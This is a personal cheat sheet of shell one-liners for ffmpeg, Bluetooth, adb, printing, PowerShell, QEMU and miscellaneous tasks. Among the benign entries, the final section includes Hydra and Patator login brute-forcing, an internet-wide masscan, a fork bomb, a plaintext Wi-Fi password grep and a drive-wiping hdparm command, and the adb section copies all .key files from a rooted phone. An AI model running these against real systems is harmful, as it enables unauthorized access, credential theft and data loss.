($) Stream desktop and default microphone: `KEY="your-key-goes-here" && ffmpeg -stream_loop -1 -re -f x11grab -i :0.0 -f pulse -ac 2 -i default -c:v libx264 -pix_fmt yuv420p -preset superfast -r 24 -g 48 -b:v 1500k -c:a aac -f flv "rtmp://a.rtmp.youtube.com/live2/$KEY"`
($) Stream webcam (`/dev/video1`) and default microphone: `KEY="your-key-goes-here" && ffmpeg -stream_loop -1 -re /dev/video1 -f pulse -ac 2 -i default -c:v libx264 -pix_fmt yuv420p -preset superfast -r 24 -g 48 -b:v 1500k -c:a aac -f flv "rtmp://a.rtmp.youtube.com/live2/$KEY"`

($) Capture main screen (:0) and the default Pulse Audio sink: `ffmpeg -video_size 1366x768 -framerate 30 -f x11grab -i :0.0 -f pulse -ac 2 -i default -c:v libx264rgb -crf 0 -preset ultrafast -c:a libopus output.mkv`
($) Take the audio of the first source and the video of the second source and combine: `ffmpeg -i "https://ycradio.stream.publicradio.org/ycradio.aac" -i "video.mp4" -c:a aac -c:v copy -map 0:a:0 -map 1:v:0 -f matroska out.mkv`
($) Merge a video that contains audio with an audio stream: `ffmpeg -i "https://hygge.stream.publicradio.org/hygge.aac" -i "walk_in_the_rain.mp4" -c:a aac -c:v copy -filter_complex "[0:a][1:a]amerge=inputs=2[aout]" -map "[aout]" -map 1:v:0 -f matroska - | ffplay -`
($) Visual spectrograph of an audio stream: `ffmpeg -i "https://nightride.fm/stream/nightride.m4a" -filter_complex "[0:a]avectorscope=s=480x480:zoom=1.5:rc=0:gc=200:bc=0:rf=0:gf=40:bf=0,format=yuv420p[v]; [v]pad=854:480:187:0[out]" -map "[out]" -map 0:a -b:v 700k -b:a 360k -f matroska - | ffplay -`
($) Loop stream a video on the local network: `ffmpeg -stream_loop -1 -i .\campfire.mkv -preset ultrafast -vcodec libx264 -tune zerolatency -b 900k -f mpegts udp://localhost:1234`

FFMPEG (WINDOWS)
================
($) (Windows) Get names of devices for commands below: `ffmpeg -list_devices true -f dshow -i dummy`
($) (Windows) Play borderless webcam (mpv): `mpv -border=no -no-osc --ontop av://dshow:video="NAMEOFWEBCAM"`
($) (Windows) Play borderless webcam (ffplay): `ffplay -noborder -probesize 32 -sync ext -f dshow -i video="Integrated Camera" -vf scale=320:-1`
($) (Windows) Capture desktop including microphone, using gdigrab: `ffmpeg -f gdigrab -framerate 30 -i desktop -f dshow -i audio="Microphone Array (Realtek(R) Audio)" -c:v libx264rgb -crf 0 -preset ultrafast demo_$(Get-Date -UFormat "+%Y%m%d_%H%M%S").mkv`
($) (Windows) Capture a region of the desktop: `ffmpeg -f gdigrab -framerate 6 -offset_x 10 -offset_y 20 -video_size vga -i desktop out.mpg`
($) (Windows) Capture a window by window title: `ffmpeg -f gdigrab -framerate 6 -i title=Calculator out.mpg`
($) (Windows) Capture desktop using a virtual device (need 3rd party - see trac URL above): `ffmpeg -f dshow -i video="UScreenCapture" -f dshow -i audio="NAMEOFMICROPHONE" output.mkv`
($) (Windows) YouTube stream desktop with default microphone: `ffmpeg -stream_loop -1 -re -f gdigrab -rtbufsize 100M -i desktop -f dshow -i audio="Microphone Array (Realtek(R) Audio)" -c:v libx264 -pix_fmt yuv420p -preset ultrafast -r 24 -g 48 -b:v 1500k -c:a aac -f flv "rtmp://a.rtmp.youtube.com/live2/YOURKEYGOESHERE"`
($) (Windows) Open a borderless webcam with `mpv` (good for streaming purposes): `mpv -border=no -no-osc --ontop --profile=low-latency av://dshow:video="Integrated Camera"`
($) (Windows) YouTube webcam and microphone: `KEY="your-key-goes-here" && ffmpeg -stream_loop -1 -re -f dshow -rtbufsize 100M -i video="Integrated Camera" -f dshow -i audio="Microphone Array (Realtek(R) Audio)" -c:v libx264 -pix_fmt yuv420p -preset superfast -r 24 -g 48 -b:v 1500k -c:a aac -f flv "rtmp://a.rtmp.youtube.com/live2/$KEY"`

BLUETOOTHCTL COMMANDS
=====================
($) List available controllers: `bluetoothctl -- list`
($) Controller information: `bluetoothctl -- show`
($) Select default controller: `bluetoothctl -- select`
($) List available devices: `bluetoothctl -- devices`
($) List paired devices: `bluetoothctl -- paired-devices`
($) Set controller alias: `bluetoothctl -- system-alias`
($) Reset controller alias: `bluetoothctl -- reset-alias`
($) Set controller power: `bluetoothctl -- power on`
($) Set controller pairable mode: `bluetoothctl -- pairable`
($) Set controller discoverable mod: `-- discoverable`
($) Set discoverable timeout: `bluetoothctl -- discoverable-timeout`
($) Enable/disable agent with given capabilit: `-- agent`
($) Set agent as the default one: `bluetoothctl -- default-agent`
($) Enable/disable advertising with given typ: `-- advertise`
($) Set device alias: `bluetoothctl -- set-alias`
($) Scan for devices: `bluetoothctl -- scan`
($) Device information: `bluetoothctl -- info`
($) Pair with device: `bluetoothctl -- pair`
($) Cancel pairing with device: `bluetoothctl -- cancel-pairing`
($) Trust device: `bluetoothctl -- trust`
($) Untrust device: `bluetoothctl -- untrust`
($) Block device: `bluetoothctl -- block`
($) Unblock device: `bluetoothctl -- unblock`
($) Remove device: `bluetoothctl -- remove`
($) Connect device: `bluetoothctl -- connect`
($) Disconnect device: `bluetoothctl -- disconnect`

ANDROID ADB
===========
($) Launches camera via adb: `adb shell "input keyevent KEYCODE_CAMERA"`
($) Lists keys: `adb shell getevent -pl`
($) List installed packages: `adb shell pm list packages`
($) Uninstall bloatware on your android device without root.: `adb shell pm uninstall --user 0 com.package.name`
($) Open application: `adb shell monkey -p com.dev47apps.droidcamx 1`
($) Send on/off key press (activates screen): `adb shell input keyevent 26`
($) Download all .key files from your android device to your pc.: `for i in $(adb shell "su -c find /data /system -name '*.key'"); do mkdir -p ".$(dirname $i)";adb shell "su -c cat $i" > ".$i";done`
($) Download all default installed apk files from your android.: `for i in $(adb shell pm list packages | awk -F':' '{print $2}'); do adb pull "$(adb shell pm path $i | awk -F':' '{print $2}')"; mv *.apk $i.apk 2&> /dev/null ;done`
($) Factory reset your android device via commandline.: `am broadcast -a android.intent.action.MASTER_CLEAR`

PRINTING - CUPS
===============
($) Enable and start CUPS daemon: `systemctl enable --now cups`
($) Manage printers and options through the CUPS interface: http://localhost:631
($) View the status of known printers: `lpstat -s`
($) List all known options: `lpoptions -l`
($) Set default printer (TAB complete usually works): `lpoptions -d Ricoh-VW-440DN`
($) Print a test page (search your CUPS package install for correct file path): `lpr /usr/share/cups/data/testprint`
($) Print file to a specific printer: `lpr -P Ricoh-VW-440DN path/to/file`
($) Print a file to the default printer: `lpr path/to/file`
($) Print 2 copies: `lpr -# 2 path/to/file`
($) Print to a named printer: `lpr -P printer path/to/file`
($) Print either a single page (e.g. 2) or a range of pages (e.g. 2–16): `lpr -o page-ranges=2|2-16 path/to/file`
($) Print double-sided either in portrait (long) or in landscape (short): `lpr -o sides=two_sided_long_edge|two_sided_short_edge path/to/file`
($) Set page size (more options may be available depending on setup): `lpr -o media=a4|letter|legal path/to/file`
($) Print multiple pages per sheet: `lpr -o number-up=2|4|6|9|16 path/to/file`

POWERSHELL (IS NOT THAT BAD)
============================
($) (Powershell) Change directory (`cd` works as well): `Set-Location .\mydir`
($) (Powershell) Find files, recursively (`find . -type f` on linux): `Get-ChildItem -Filter '*myfile*' -Recurse -File`
($) (Powershell) List files sorted by date (`ls -ltr` on linux): `Get-ChildItem $env:USERPROFILE\Desktop | Sort-Object -Property LastWriteTime`
($) (Powershell) Copy files recursively to home directory (`cp -R mydir ~` on linux): `Copy-Item -Path '.\mydir\' -Destination $env:USERPROFILE -Recurse`
($) (Powershell) Remove a directory forcefully (`rm -rf ./mydir` in linux): `Remove-Item .\mydir -Recurse -Force`
($) (Powershell) Make new directories recursively (`mkdir -p ./NewFolder/Test` on linux): `New-Item -ItemType Directory -Name 'NewFolder\Test'`
($) (Powershell) Create four new blank files (`touch MyFile_{1..4}` on linux): `1..4 | ForEach-Object { New-Item -ItemType File -Name "MyFile$_" }`
($) (Powershell) Get the tail 7 lines of a file (`tail -n7 ./MyFile1` on linux): `Get-Content -Tail 7 .\MyFile1`
($) (Powershell) Find a string in a file (`grep "Failed" iis.log` on linux): `Select-String -Path 'C:\Windows\iis.log' -Pattern 'Failed'`
($) (Powershell) Get OS information (`uname -a` on linux): `Get-CimInstance Win32_OperatingSystem | Select-Object 'Caption', 'CSName', 'Version', 'BuildType', 'OSArchitecture' | Format-Table -AutoSize`
($) (Powershell) Get attached device information (`lsusb` or `lsdev` on linux): `Get-PnpDevice -PresentOnly`
TODO (*) (Powershell) Create a new volume (`mkfs` on linux): ``
($) (Powershell) Ping works too - test a connection: `Test-Connection 192.168.0.21 | Format-Table -AutoSize`
($) (Powershell) Get help on the command Stop-Service (`man` on linux): `Get-Help Stop-Service -Full`
($) (Powershell) Select specific columns from output: `Get-ChildItem $env:USERPROFILE\Desktop -Filter "*.ps1" | Select-Object -Property 'Name', 'Length'`
($) (Powershell) Remove the bracketed date from filenames: `Get-ChildItem -Recurse | Where-Object { $_.Name -match " ?\(\d\d\d\d_\d\d_\d\d \d\d_\d\d_\d\d UTC\)" } | Rename-Item -NewName { $_.Name -replace " ?\(\d\d\d\d_\d\d_\d\d \d\d_\d\d_\d\d UTC\)", ""}`
($) (Powershell) Application network trace based on application name: `while(1 -eq 1 ) {Get-Process -Name msedge | Select-Object -ExpandProperty ID | ForEach-Object {Get-NetTCPConnection -OwningProcess $_ -ErrorAction SilentlyContinue } -ErrorAction SilentlyContinue }`
($) (Powershell) Get last boot time: `Get-CimInstance -ClassName win32_operatingsystem | select csname,lastbootuptime`
($) (Powershell) Backup with versioning: `& 'C:\cwRsync_5.5.0_x86_Free\bin\rsync.exe' --force --ignore-errors --no-perms --chmod=ugo=rwX --checksum --delete --backup --backup-dir="_EVAC/$(Get-Date -Format "yyyy-MM-dd-HH-mm-ss")" --whole-file -a -v "//MyServer/MyFolder" "/cygdrive/c/Backup"`

VIRTUALIZATION
==============
($) Create a 4 GiB image in the raw format: `qemu-img create -f raw image_file 4G`
($) Create a 4 GiB image in the qcow2 format: `qemu-img create -f qcow2 image_file 4G`
($) To change (e.g. increase) image space to a raw or qcow2 image by 10 GiB, run (backup NTFS filesystems first!): `qemu-img resize disk_image +10G`
($) Convert a raw image to qcow2: `qemu-img convert -f raw -O qcow2 input.img output.qcow2`
($) On i386 guests, to install from a bootable ISO file as CD-ROM and a raw disk image (default 128 MB memory): `qemu-system-x86_64 -cdrom iso_image -boot menu=on -drive file=disk_image,format=raw`
($) Boot a flash disk in QEMU to test it: `qemu-system-x86_64 -rtc base=localtime -m 2G -vga std -drive file=/dev/sdb,readonly=on,cache=none,format=raw,if=virtio`

COMBOS (BOX OF CHOCOLATES EDITION)
==================================
($) Get a random (uniform) integer between 1 and 100: `echo $(( ( RANDOM % 100 ) + 1))`
($) Calculate pi to an arbitrary number of decimal places: `bc -l <<< "scale=1000; 4*a(1)"`
($) Print all colours in terminal: `(x=$(tput op) y=$(printf %76s);for i in {0..256};do o=00$i;echo -e ${o:${#o}-3:3} $(tput setaf $i;tput setab $i)${y// /=}$x;done)`
($) Remove ANSI colour escape codes from a file: `sed 's/\x1b\[[0-9;]*m//g'`

($) Change all file extensions from txt to xml: `for file in *.txt; do mv "$file" "${file%.txt}.xml"; done`
($) Silently deletes lines containing a specific string in a bunch of files: `for file in $(egrep 'abc|def' *.sql | cut -d":" -f1 | uniq); do    sed -i '/abc/d' ./$file ; sed -i '/def/d' ./$file; done`
($) Rename all files in lower case: `for f in $(find); do mv -v "$f" "$(echo $f | tr '[A-Z]' '[a-z]')"; done`

($) Console clock: `while sleep 1; do     tput sc;     tput cup 0 $(($(tput cols)-29));     date;     tput rc; done &`
($) Shamefully scrape commandlinefu oneliners: `URL="http://www.commandlinefu.com" && wget -O - --save-cookies c $URL && for i in {0..564};do wget -w 8 --random-wait -O - --load-cookies c $URL/commands/browse/plaintext/$i >> ~/commands.txt ;done;rm -f c`
($) List top 100 djs from https://djmag.com/top100djs: `lynx -listonly -nonumbers -dump https://djmag.com/top100djs|sed '1d'|cut -d- -f5,6,7|sed -n '180,$p'|nl --number-format=rn --number-width=3|sed 's/-/ /g'|sed -e 's/.*/\L&/' -e 's/\<./\u&/g'`
($) lynx - Get a text-only version of a website: `lynx -dump -dont_wrap_pre "URL" >> dump.txt`
($) sxiv - Search directory for files and run them as a slideshow: `sxiv -S 2 -i <<< $(find . -type f)`
($) Convert JSON to YAML: `yq . -y <example.json`
($) From all PDF files in all subdirectories, extract two metadata fields (here: Creator and Producer) into a CSV table: `echo "File;Creator;Producer";find . -name '*.pdf' -print0 | while IFS= read -d $'\0' line;do echo -n "$line;";pdfinfo "$line" | perl -ne 'if(/^(Creator|Producer):\s*(.*)$/){print"$2";if ($1 eq "Producer"){exit}else{print";"}}';echo;done 2>/dev/null`
($) Fetch current outside temperature at location bc-32 (Canada, see weather.gc.ca): `curl -s https://weather.gc.ca/rss/city/bc-32.xml | grep -oP '(?<=Current Conditions: )\d{1,}\.\d{1,}'`
($) Convert a website into a PDF: `wkhtmltopdf "https://weather.gc.ca/city/pages/bc-32_metric_e.html" - | zathura -`
($) Print out ANSI colours and escape codes: `for x in {0..8}; do for i in {30..37}; do for a in {40..47}; do echo -ne "\e[$x;$i;$a""m\\\e[$x;$i;$a""m\e[0;37;40m "; done; echo; done; done; echo ""`
($) Find (grep) files with oldpattern and replace with newpattern: `grep /path/to/search -rl -e "oldpattern" | xargs sed -i "s/oldpattern/newpattern/g"`
($) Get rid of lines with non ascii characters: `grep -v $'[^\t\r -~]' my-file-with-non-ascii-characters`
($) Print hugepage consumption of each process: `grep -e AnonHugePages  /proc/*/smaps | awk  '{ if($2>4) print $0} ' |  awk -F "/" '{system("cat /proc/" $3 "/cmdline");printf("\n");print $0; printf("\n");}'`
($) Find Apache Root document: `grep -e '^[[:blank:]]*DocumentRoot[[:blank:]]\S'`
($) Extract queries from mysql general log: `grep -Eo '( *[^ ]* *){4}Invoice_Template( *[^ ]* *){4}' /mysql-bin-log/mysql-gen.log | head -10000 | sort -u`
($) Find passwords that has been stored as plain text in NetworkManager: `grep -H '^psk=' /etc/NetworkManager/system-connections/*`
($) Find Apache Root document: `grep -i 'DocumentRoot' /usr/local/apache/conf/httpd.conf`
($) Show OS release incl version.: `grep -m1 -h [0-9] /etc/{*elease,issue} 2>/dev/null | head -1`
($) Recall Nth command from your BASH history without executing it.: `!12:p`
($) Learn the difference between single and double quotes: `a=7; echo $a; echo "$a"; echo '$a'; echo "'$a'"; echo '"$a"'`
($) Bash alias to output the current Swatch Internet Time: `alias beats='echo '\''@'\''$(TZ=GMT-1 date +'\''(%-S + %-M * 60 + %-H * 3600) / 86.4'\''| bc)'`
($) Replacement of tree command (ignore node_modules): `alias tree='pwd;find . -path ./node_modules -prune -o -print | sort | sed '\''1d;s/^\.//;s/\/\([^/]*\)$/|--\1/;s/\/[^/|]*/| /g'\'''`
($) Faciliate the work for lftp ('all' is needed if you wanna use it with getopts, otherwise its enough with the lftp line): `all="$(echo -e $*| awk '{for(i=3;i<=NF;++i)print $i}'|xargs)"; lftp -e open <HOSTNAME> -p <PORT> -u <USER>:<PASSWORD> -e "$all;exit"`
($) Change values from 0 to 100: `awk '{if ($3 =="LAN" && $5 == "0.00" ) print $1,  $2, "LAN",  "288",  "100.00"; else print $1 ,$2, $3, $4, $5 }' sla-avail-2013-Feb > sla-avail-2013-Feb_final`
($) Use was ec2 describe instances to retrieve IAM roles for specific ec2 tag to css list: `aws ec2 describe-instances --region us-east-1 --filters "Name=tag:YourTag,Values=YourValue" |  jq '.["Reservations"]|.[]|.Instances|.[]|.IamInstanceProfile.Arn + "," +.InstanceId'`
($) Get a list of stale AWS security groups: `aws ec2 describe-vpcs --query 'Vpcs[*].VpcId' --output text | xargs -t -n1 aws ec2 describe-stale-security-groups --vpc-id`
($) Rclone - include Service account blobs to your config: `bash -c 'COUNT=0; for i in $(find . -iname "*.json");do ((count=count+1));VAL=`cat ${i} | jq -c '.'` ; echo "[dst$count]";echo "type = drive";echo "scope = drive";echo "service_account_credentials = $VAL" ; echo "team_drive = 0AKLGAlhvkJYyUk9PVA" ;done'`
($) Banner Grabber: `bash -c 'exec 3<>/dev/tcp/google.com/80; echo EOF>&3; cat<&3'`
($) Show which line of a shell script is currently executed: `bash -x foo.sh`
($) Add keybindings for cycling through completions (or for inserting the last or first completion) in Bash: `bind '"\er":menu-complete-backward';bind '"\es":menu-complete'`
($) Bitcoin Brainwallet Private Key Calculator: `bitgen hex 12312381273918273128937128912c3b1293cb712938cb12983cb192cb1289b3 info`
($) Shell pocket calculator (pure sh): `calc(){ printf "%.8g\n" $(printf "%s\n" "$*" | bc -l); }`
($) Convert JSON object to JavaScript object literal: `cat data.json | json-to-js | pbcopy`
($) Generate cryptographically Secure RANDOM PASSWORD: `cat /dev/urandom | tr -c -d '[:alnum:]' | head -c 16;echo`
($) Extract a Zip File from STDOUT with the Jar Command: `cat foo.zip | jar xv`
($) Convert tab separate file (TSV) to JSON with jq: `cat input.tsv | jq --raw-input --slurp 'split("\n") | map(split("\t")) | .[0:-1] | map( { "id": .[0], "ip": .[1] } )'`
($) SFTP upload through HTTPS proxy: `cat myFile.json | ssh root@remoteSftpServer -o "ProxyCommand=nc.openbsd -X connect -x proxyhost:proxyport %h %p" 'cat > myFile.json'`
($) Batch-Convert text file containing youtube links to mp3: `cat playlist.txt | while read line; do youtube-dl --extract-audio --audio-format mp3 -o "%(title)s.%(ext)s" ytsearch:"$line"  ;done`
($) Parse and format IP:port currently in listen state without net tools: `cat /proc/net/tcp | grep " 0A " | sed 's/^[^:]*: \(..\)\(..\)\(..\)\(..\):\(....\).*/echo $((0x\4)).$((0x\3)).$((0x\2)).$((0x\1)):$((0x\5))/g' | bash`
($) Convert epoch date to human readable date format in a log file.: `cat /var/log/mosquitto/mosquitto.log | awk -F : '{"date -d @"$1 |& getline D; print D, $0}'`
($) Get the full path of a bash script's Git repository head.: `(cd "$(dirname "${BASH_SOURCE[0]}")" && git rev-parse --show-toplevel)`
($) Jump to home dir and list all, not older than 3 days, with full-path, hidden/non-hidden files/subdirectories: `cd && tree -aicfnF --timefmt %Y%j-%d-%b-%y | grep $(date +%Y%j)'\|'$[$(date +%Y%j)-1]'\|'$[$(date +%Y%j)-2]`
($) After typing lots of commands in windows, save them to a batch file quickly: `copy con batchfilename.bat`
($) Remove multiple entries of the same command in .bash_history with preserving the chronological order: `cp -a  ~/.bash_history ~/.bash_history.bak && perl -ne 'print unless $seen{$_}++'  ~/.bash_history.bak >~/.bash_history`
($) Create backup copy of file, adding suffix of the date of the file modification (NOT today's date): `cp file{,.$(date -d @$(stat -c '%Y' file) "+%y%m%d")}`
($) Create backup copy of file, adding suffix of the date of the file modification (NOT today's date): `cp file{,.$(date -r file "+%y%m%d")}`
($) Create backup copy of file, adding suffix of the date of the file modification (NOT today's date): `cp file file.$(date -d @$(stat -c '%Y' file) "+%y%m%d")`
($) Generate random mac-address using md5sum + sed: `date | md5sum | sed -r 's/(..){3}/\1:/g;s/\s+-$//'`
($) Poor man's ntpdate: `date -s "$(curl -sD - www.example.com | grep '^Date:' | cut -d' ' -f3-6)Z"`
($) Hide or show Desktop Icons on MacOS: `defaults write com.apple.finder CreateDesktop -bool false;killall Finder`
($) Find German synonyms using OpenThesaurus: `desyno(){ wget -q -O- https://www.openthesaurus.de/synonyme/search\?q\="$*"\&format\=text/xml | sed 's/>/>\n/g' | grep "<term term=" | cut -d \' -f 2 | paste -s -d , | sed 's/,/, /g' | fold -s -w $(tput cols); }`
($) Update all Docker Images: `docker images --format "{{.Repository}}:{{.Tag}}" | grep ':latest' | xargs -L1 docker pull`
($) Determine if booted as EFI/UEFI or BIOS: `[[ -d "/sys/firmware/efi" ]] && echo "UEFI" || echo "BIOS"`
($) Simplest calculator: `echo $[321*4]`
($) Produce 10 copies of the same string: `echo boo{,,,,,,,,,,}`
($) Check if port is open on remote machine: `echo >  /dev/tcp/127.0.0.123/8085 && echo "Port is open"`
($) Check web server port 80 response header: `(echo -e 'GET / HTTP/1.0\r\n\r\n';) | ncat <IPaddress> 80`
($) Fork bomb (don't actually execute): `echo -e "\x23\x21/bin/bash\n\.\/\$\0\&\n\.\/\$\0\&" > bomb.sh && ./bomb.sh`
($) Pretty print json block that has quotes escaped: `echo 'json_here' | sed 's/\\//g' | jq .`
($) Test sendmail: `echo "Subject: test" | /usr/lib/sendmail -v me@domain.com`
($) (OSX) Script to change Terminal profiles based on machine name: `echo "tell application \"Terminal\"\n\t set its current settings of selected tab of window 1 to settings set \"$PROFILE\"\n end tell" | osascript;`
($) Remove all the characters after last space per line including it: `echo 'The quick brown fox jumps over the lazy dog' | sed 's|\(.*\) .*|\1|'`
($) Remove all the characters before last space per line including it: `echo 'The quick brown fox jumps over the lazy dog' | sed 's|.* ||'`
($) Replace all forward slashes with backward slashes: `echo '/usr/bin/' | sed 's|\/|\\|g'`
($) Download all recently uploaded pastes on pastebin.com: `elinks -dump https://pastebin.com/archive | grep https | cut -c 7- | sed 's/com/com\/raw/g' | awk 'length($0)>32 && length($0)<35' | grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping'|xargs wget`
($) Crash bash: `enable -f /usr/lib/libpng.so png_create_read`
($) Save your current environment as a bunch of defaults: `env | sed 's/\(.*\)=\(.*\)/: ${\1:="\2"}/'  > mydefaults.bash`
($) Color STDERR in output: `./errorscript.sh 2> >(echo "\e[0;41m$(cat)\e[0m")`
($) Unset all http proxy related environment variables in one go in the current shell: `eval "unset $(printenv | grep -ioP '(?:https?|no)_proxy' | tr '\n' ' ')"`
($) Create a nicely formatted example of a shell command and its output: `example() { echo "EXAMPLE:"; echo; echo "    $@"; echo; echo "OUTPUT:"; echo ; eval "$@" | sed 's/^/    /';  }`
($) Set pcap & SUID Bit for priv. network programs (like nmap): `export BIN=`which nmap` && sudo setcap cap_net_raw,cap_net_admin+eip $BIN && sudo chown root $BIN && sudo chmod u+s $BIN`
($) Store Host IP in variable: `export IP="$(hostname -I | awk '{print $1}')"`
($) This will take the last two commands from bash_history and  open your editor with the commands on separated lines: `fc -1 -2`
($) List human readable files: `file * | grep 'ASCII text' | sort  -rk2`
($) Rename / move Uppercase filenames to lowercase filenames current directory: `FileList=$(ls); for FName in $FileList; do LowerFName=$(echo "$FName" | tr '[:upper:]' '[:lower:]'); echo $FName" rename/move to $LowerFName"; mv $FName $LowerFName;  done`
($) PHP7 - Fix incompatibility errors like: Parse error: syntax error, unexpected new (T_NEW) in file.php on line...: `find "$(realpath ./)" -type f \( -iname "*.php" -or -iname "*.inc" \) -exec sed -i -r "s~=[[:space:]]*&[[:space:]]*new[[:space:]]+~= new ~gi" {} \;`
($) Edit, view or execute last modified file with a single key-press: `f() { ls -lart;e="ls -tarp | grep -v / | tail -9";j=${e/9/1};g=${e/9/9 | nl -nln};h=$(eval $j);eval $g;read -p "e|x|v|1..9 $(eval $j)?" -n 1 -r;case $REPLY in e) joe $h;;v)cat $h;;x) eval $h;;[1-9]) s=$(eval $g | egrep ^$REPLY) && touch "${s:7}" && f;;esac ; }`
($) Checks size of directory and delete it if it's too small: `for i in *;  do test -d "$i" && ( rclone size "$i" --json -L 2> /dev/null | jq --arg path "$i" 'if .bytes < 57462360 then ( { p: $path , b: .bytes}) else "none" end' | grep -v none | jq -r '.p' | parallel -j3 rclone purge "{}" -v -P ); done`
($) Get all Google ipv4/6 subnets for a iptables firewall for example (updated version): `for NETBLOCK in $(echo _netblocks.google.com _netblocks2.google.com _netblocks3.google.com); do nslookup -q=TXT $NETBLOCK ; done | tr " " "\n" | grep ^ip[46]: | cut -d: -f2- | sort`
($) WSL: Change the current directory converting a Windows path to a Linux Path: `function _cd() { local dir; dir="$(sed -e 's~\([a-z]\):~/mnt/\L\1~gi' <<< "${*//'\'/"/"}" )"; if [ -d "$dir" ]; then cd "$dir" || exit; fi; }`
($) Uniquely (sort of) color text so you can see changes: `function colorify() { n=$(bc <<< "$(echo ${1}|od -An -vtu1 -w100000000|tr -d ' ') % 7"); echo -e "\e[3${n}m${1}\e[0m"; }`
($) Autocomplete directories (CWDs) of other ZSH processes (MacOS version): `function _xterm_cwds() { for pid in $(pgrep -x zsh); do reply+=$(lsof -p $pid | grep cwd | awk '{print $9}') done }; function xcd() { cd $1 }; compctl -K _xterm_cwds xcd`
($) Find out how much ram memory has your video (graphic) card: `glxinfo |grep -i -o 'device|memory\|[0-9]\{1,12\} MB'|head -n 1`
($) Add a mysql user: `grant all on *.* to 'dba'@'localhost' identified by 'dba123' with grant option;`
($) Reduce PDF Filesize: `gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -dNOPAUSE -dBATCH  -dQUIET  -dColorImageResolution=600 -dMonoImageResolution=600 -sOutputFile=output.pdf input.pdf`
($) Factory reset your harddrive. (BE CAREFUL!): `hdparm --yes-i-know-what-i-am-doing --dco-restore /dev/sdX`
($) Calculate the distance (in km) between two geographic coordinates points (usage e.g.: h 52.342 118.45 34.9 20.2): `h(){ echo $@|awk '{d($1,$2,$3,$4);} function d(x,y,x2,y2,a,c,dx,dy){dx=r(x2-x);dy=r(y2-y);x=r(x);x2=r(x2);a=(sin(dx/2))^2+cos(x)*cos(x2)*(sin(dy/2))^2;c=2*atan2(sqrt(a),sqrt(1-a)); printf("%.4f",6372.8*c);} function r(g){return g*(3.1415926/180.);}';}`
($) Bruteforce Synology NAS Logins with Hydra: `hydra  -I -V -T 5 -t 2  -s 5001 -M /tmp/syno https-post-form '/webman/login.cgi?enable_syno_token=yes:username=^USER^&passwd=^PASS^&OTPcode=:S=true' -L ./ruby-syno-brut/user -P ruby-syno-brut/passlist-short-2.txt`
($) Iso to USB with dd and show progress status: `image="file.iso";drive="/dev/null";sudo -- sh -c 'cat '"${image}"'|(pv -n -s $(stat --printf="%s" '"${image}"')|dd of='"${drive}"' obs=1M oflag=direct) 2>&1| dialog --gauge "Writing Image '"${image}"' to Drive '"${drive}"'" 10 70 7'`
($) Block all brute force attacks in realtime (IPv4/SSH): `inotifywait -r -q --format %w /var/log/auth.log|grep -i "Failed pass"|tail -n 1|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}';iptables -I INPUT -i eth0 -s "$(cat /var/log/auth.log|grep "authentication failure; l"|awk -Frhost= '{print $2}'|tail -n 1)" -j DROP`
($) To create files with specific permission: `install -b -m 777 /dev/null file.txt`
($) Keytool using BouncyCastle as security provider to add a X509 certificate: `keytool -importcert -providerpath bcprov-jdk15on-1.60.jar -provider org.bouncycastle.jce.provider.BouncyCastleProvider -storetype BCPKCS12 -trustcacerts -alias <alias> -file <filename.cer> -keystore <filename>`
($) Keytool using BouncyCastle as security provider to add a PKCS12 certificate store: `keytool -importkeystore -providerpath bcprov.jar -provider BouncyCastleProvider -srckeystore <filename.pfx> -srcstoretype pkcs12 -srcalias <src-alias> -destkeystore <filename.ks> -deststoretype BCPKCS12 -destalias <dest-alias>`
($) Keytool view all entries in a keystore with BouncyCastle as security provider: `keytool -list -providerpath bcprov-jdk15on-1.60.jar -provider org.bouncycastle.jce.provider.BouncyCastleProvider -storetype BCPKCS12 -storepass <passphrase> -keystore <filename>`
($) Trim disk image for best compression before distributing: `kpartx -av disk.img && mkdir disk && mount /dev/mapper/loop0p1 disk && fstrim -v disk && umount disk && kpartx -d disk.img`
($) Countdown Clock: `let T=$(date +%s)+3*60;while [ $(date +%s) -le $T ]; do let i=$T-$(date +%s); echo -ne "\r$(date -d"0:0:$i" +%H:%M:%S)"; sleep 0.3; done`
($) Display list of available printers: `lpstat -p`
($) Slow Down Command Output: `ls -alt|awk '{if (system("sleep .5 && exit 2") != 2) exit; print}'`
($) Listing today's files only: `ls -al --time-style=+%D| grep `date +%D``
($) Display information about the CPU: `lscpu | egrep 'Model name|Socket|Thread|NUMA|CPU\(s\)'`
($) Find out  how much ram memory has your video (graphic) card: `lspci|grep -i "VGA Compatible Controller"|cut -d' ' -f1|xargs lspci -v -s|grep ' prefetchable'`
($) List files size sorted and print total size in a human readable format without sort, awk and other commands.: `ls -sSh /path | head`
($) Scan multiple log subdirectories for the latest log files and tail them: `ls /var/log/* -ld | tr -s " " | cut -d" " -f9 | xargs -i{} sh -c 'echo "\n---{}---\n"; tail -n50 {}/`ls -tr {} | tail -n1`'`
($) Scan whole internet and specific port in humanistic time: `masscan 0.0.0.0/0 -p8080,8081,8082 --max-rate 100000 --banners --output-format grepable --output-filename /tmp/scan.xt --exclude 255.255.255.255`
($) Convert CSV to JSON with miller: `mlr --c2j --jlistwrap cat file.csv`
($) Which processes are listening on a specific port (e.g. port 80): `netstat -nap|grep 80|grep LISTEN`
($) Show which programs are listening on TCP ports: `netstat -tlpn`
($) List all global top level modles, then remove ALL npm packages with xargs: `npm ls -gp --depth=0 | awk -F/ '/node_modules/ && !/\/npm$/ {print $NF}' | xargs npm -g rm; npm -g uninstall npm`
($) (OSX) Convert rich text on the clipboard to Markdown: `osascript -e'get the clipboard as"RTF "'|sed 's/«data RTF //;s/»//'|xxd -r -p|textutil -convert html -stdin -stdout|pandoc -f html -t markdown_strict --no-wrap --atx-headers`
($) (OSX) List the URLs of tabs of the frontmost Chrome window in OS X: `osascript -e{'set text item delimiters to linefeed','tell app"google chrome"to url of tabs of window 1 as text'}`
($) Patator: A Hydra brute force alternative: `patator ssh_login host=192.168.1.16 port=22 user=FILE0 0=user.lst password=FILE1 1=pass.lst -x ignore:mesg='Authentication failed.'`
($) Create POSIX tar archive: `pax -wf archive.tar /path`
($) Print CPU load in percent: `printf "1-minute load average: %.1f%%\n" \ $(bc <<<"$(cut -d ' ' -f 1 /proc/loadavg) * 100")`
